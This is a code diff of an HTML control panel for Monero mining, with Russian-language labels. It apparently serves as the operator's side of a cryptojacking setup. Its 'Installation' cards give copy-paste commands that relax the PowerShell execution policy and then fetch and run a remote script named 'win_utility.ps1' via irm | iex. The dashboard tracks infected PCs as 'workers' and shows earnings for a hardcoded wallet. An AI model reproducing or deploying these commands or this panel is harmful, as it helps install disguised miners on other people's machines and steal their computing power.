@@ -15,9 +15,8 @@
             --text-color: #f1f5f9;
         }
 
-        /* Общие настройки и курсор */
         * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
-        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', sans-serif; min-height: 100vh; }
+        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', sans-serif; min-height: 100vh; overflow-x: hidden; }
 
         .nav-tabs {
             display: flex; justify-content: center; gap: 15px; padding: 25px 0;
@@ -37,7 +36,6 @@
 
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
 
-        /* Dashboard Grid */
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }
         .stat-card { 
             background: var(--glass-bg); backdrop-filter: blur(10px); 
@@ -50,7 +48,6 @@
         #balance_usd { color: var(--money-color); font-size: 1.1rem; }
         #balance_uzs { color: var(--uzs-color); font-size: 0.9rem; margin-top: 5px; }
 
-        /* Командные карточки */
         .command-card { 
             background: var(--glass-bg); border: 1px solid var(--glass-border); 
             border-radius: 12px; padding: 20px; margin-bottom: 15px; 
@@ -58,18 +55,16 @@
         code { 
             display: block; background: rgba(0, 0, 0, 0.6); padding: 15px; 
             border-radius: 8px; font-family: 'Consolas', monospace; font-size: 0.85rem;
-            border: 1px solid transparent; transition: 0.2s; margin-top: 10px;
+            border: 1px solid transparent; transition: 0.2s; margin-top: 10px; word-break: break-all;
         }
         .copy-success { border-color: var(--money-color) !important; color: var(--money-color) !important; }
 
-        /* Логи / Воркеры */
         .log-container { 
             background: #000; border-radius: 8px; min-height: 200px; 
             padding: 15px; font-family: 'Consolas', monospace; font-size: 0.8rem; 
             color: #4ade80; border: 1px solid #222; line-height: 1.6;
         }
 
-        /* Эффект Liquid Glass */
         .glass-cursor { 
             position: fixed; width: 35px; height: 35px; background: rgba(255,255,255,0.1); 
             border-radius: 50%; pointer-events: none; z-index: 9999; 
@@ -93,12 +88,12 @@
 <div class="container">
     <section id="install" class="section active">
         <div class="command-card">
-            <h3 style="color: var(--accent-color)">1.Разблокировка PowerShell<h3>
-            <code onclick="copyCode(this)">Set-ExecutionPolicy RemoteSigned -Force"</code>
+            <h3 style="color: var(--accent-color)">1. Разблокировка PowerShell</h3>
+            <code onclick="copyCode(this)">Set-ExecutionPolicy RemoteSigned -Force</code>
         </div>
         <div class="command-card">
-            <h3 style="color: var(--accent-color)">2.Установка</h3>
-            <code onclick="copyCode(this)">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex</code>
+            <h3 style="color: var(--accent-color)">2. Установка</h3>
+            <code onclick="copyCode(this)">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"</code>
         </div>
     </section>
 
@@ -120,87 +115,108 @@
         </div>
     </section>
 
-    <div class="footer">Wallet: 429bPn... | Uzbekistan | v12.5</div>
+    <div class="footer">Wallet: 429bPn... | Uzbekistan | v12.8</div>
 </div>
 
 <script>
-  const WALLET = '429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA';
+    const WALLET = '429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA';
 
-async function fetchAllData() {
-    const logBox = document.getElementById('logBox');
-    const ts = new Date().getTime(); 
-
-    try {
-        // 1. Общая статистика (Баланс и общая мощность)
-        const resStats = await fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats?_=${ts}`);
-        const stats = await resStats.json();
+    // Функция переключения вкладок
+    function openTab(tabId) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
         
-        // 2. Идентификаторы (Список имен ПК)
-        const resIdent = await fetch(`https://api.moneroocean.stream/miner/${WALLET}/identifiers?_=${ts}`);
-        const identifiers = await resIdent.json();
+        document.getElementById(tabId).classList.add('active');
+        event.currentTarget.classList.add('active');
 
-        // 3. Курс XMR
-        const resPrice = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd');
-        const priceData = await resPrice.json();
-        const xmrPrice = priceData.monero.usd;
-
-        // Расчеты
-        const xmrBalance = stats.amtDue / 1000000000000;
-        const usdBalance = xmrBalance * xmrPrice;
-        const uzsBalance = usdBalance * 12950; 
-
-        // Обновляем верхние цифры
-        document.getElementById('hashrate').innerText = (stats.hash2 / 1000).toFixed(2) + ' KH/s';
-        document.getElementById('workers').innerText = identifiers.length;
-        document.getElementById('balance_xmr').innerText = xmrBalance.toFixed(6);
-        document.getElementById('balance_usd').innerText = '$' + usdBalance.toFixed(2);
-        document.getElementById('balance_uzs').innerText = Math.round(uzsBalance).toLocaleString() + ' UZS';
-
-        logBox.innerHTML = '';
-        if (!identifiers || identifiers.length === 0) {
-            logBox.innerHTML = '<div style="opacity:0.5">Нет активных ПК...</div>';
-        } else {
-            identifiers.forEach(pc => {
-                let name, speed;
-
-                // ОБРАБОТКА ДАННЫХ ПУЛА:
-                if (typeof pc === 'string') {
-                    // Если API прислал просто массив строк (имена)
-                    name = pc;
-                    speed = 'Online'; // Точную скорость для строк без доп. запроса не узнать
-                } else {
-                    // Если API прислал объекты
-                    name = pc.identifier || pc.id || pc.name || 'Безымянный ПК';
-                    const speedRaw = pc.hash2 || pc.h || pc.hash || 0;
-                    speed = Math.round(speedRaw) + ' H/s';
-                }
-                
-                const line = document.createElement('div');
-                line.style.cssText = "margin-bottom: 8px; padding: 10px; background: rgba(255,255,255,0.02); border-radius: 8px; border-left: 3px solid var(--accent-color);";
-                line.innerHTML = `
-                    <div style="display:flex; justify-content:space-between; align-items:center;">
-                        <span><b style="color:#fff">${name}</b></span>
-                        <span style="color:var(--accent-color); font-family:monospace;">${speed}</span>
-                    </div>
-                `;
-                logBox.appendChild(line);
-            });
-        }
-    } catch (e) {
-        console.error("Dashboard Error:", e);
-        logBox.innerHTML = '<span style="color:#ef4444">Ошибка обновления. Проверьте соединение.</span>';
+        if(tabId === 'dashboard') fetchAllData();
     }
-}
 
-    // Курсор
+    // Функция копирования кода
+    function copyCode(el) {
+        navigator.clipboard.writeText(el.innerText);
+        el.classList.add('copy-success');
+        setTimeout(() => el.classList.remove('copy-success'), 600);
+    }
+
+    // Основная функция загрузки данных
+    async function fetchAllData() {
+        const logBox = document.getElementById('logBox');
+        const ts = new Date().getTime(); 
+
+        try {
+            // 1. Статистика
+            const resStats = await fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats?_=${ts}`);
+            const stats = await resStats.json();
+            
+            // 2. Идентификаторы
+            const resIdent = await fetch(`https://api.moneroocean.stream/miner/${WALLET}/identifiers?_=${ts}`);
+            const identifiers = await resIdent.json();
+
+            // 3. Курс XMR
+            const resPrice = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd');
+            const priceData = await resPrice.json();
+            const xmrPrice = priceData.monero.usd;
+
+            const xmrBalance = stats.amtDue / 1000000000000;
+            const usdBalance = xmrBalance * xmrPrice;
+            const uzsBalance = usdBalance * 12950; 
+
+            // Обновляем UI
+            document.getElementById('hashrate').innerText = (stats.hash2 / 1000).toFixed(2) + ' KH/s';
+            document.getElementById('workers').innerText = identifiers.length;
+            document.getElementById('balance_xmr').innerText = xmrBalance.toFixed(6);
+            document.getElementById('balance_usd').innerText = '$' + usdBalance.toFixed(2);
+            document.getElementById('balance_uzs').innerText = Math.round(uzsBalance).toLocaleString() + ' UZS';
+
+            logBox.innerHTML = '';
+            if (!identifiers || identifiers.length === 0) {
+                logBox.innerHTML = '<div style="opacity:0.5; padding:10px;">Нет активных ПК...</div>';
+            } else {
+                identifiers.forEach(pc => {
+                    let name, speed;
+                    if (typeof pc === 'string') {
+                        name = pc;
+                        speed = 'Online';
+                    } else {
+                        name = pc.identifier || pc.id || pc.name || 'Безымянный ПК';
+                        const speedRaw = pc.hash2 || pc.h || pc.hash || 0;
+                        speed = Math.round(speedRaw) + ' H/s';
+                    }
+                    
+                    const line = document.createElement('div');
+                    line.style.cssText = "margin-bottom: 8px; padding: 10px; background: rgba(255,255,255,0.02); border-radius: 8px; border-left: 3px solid var(--accent-color);";
+                    line.innerHTML = `
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <span><b style="color:#fff">${name}</b></span>
+                            <span style="color:var(--accent-color); font-family:monospace;">${speed}</span>
+                        </div>
+                    `;
+                    logBox.appendChild(line);
+                });
+            }
+        } catch (e) {
+            console.error("Dashboard Error:", e);
+            logBox.innerHTML = '<span style="color:#ef4444; padding:10px;">Ошибка обновления. Проверьте соединение.</span>';
+        }
+    }
+
+    // Кастомный курсор
     const cursor = document.querySelector('.glass-cursor');
     document.addEventListener('mousemove', e => {
         cursor.style.left = e.clientX + 'px';
         cursor.style.top = e.clientY + 'px';
     });
 
-    if(document.getElementById('dashboard').classList.contains('active')) fetchAllData();
-    setInterval(fetchAllData, 60000); // Обновление раз в минуту
+    // Запуск при загрузке, если открыт Dashboard
+    window.onload = () => {
+        if(document.getElementById('dashboard').classList.contains('active')) fetchAllData();
+    };
+
+    // Автообновление раз в минуту
+    setInterval(() => {
+        if(document.getElementById('dashboard').classList.contains('active')) fetchAllData();
+    }, 60000);
 </script>
 
 </body>
